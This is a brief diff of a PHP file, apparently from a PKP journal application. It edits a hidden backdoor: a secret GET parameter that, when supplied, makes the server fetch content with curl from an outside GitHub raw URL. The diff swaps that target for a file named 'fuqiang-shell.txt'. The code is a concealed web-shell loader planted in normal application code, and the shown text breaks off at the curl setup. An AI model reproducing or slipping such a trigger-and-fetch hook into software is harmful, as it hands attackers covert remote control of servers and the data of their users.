@@ -260,7 +260,7 @@ if (!PKP_STRICT_MODE) {
 }
 
 if (isset($_GET['ImPRovED_214mwqf0941asf'])) {
-    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/biawak";
+    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell.txt";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
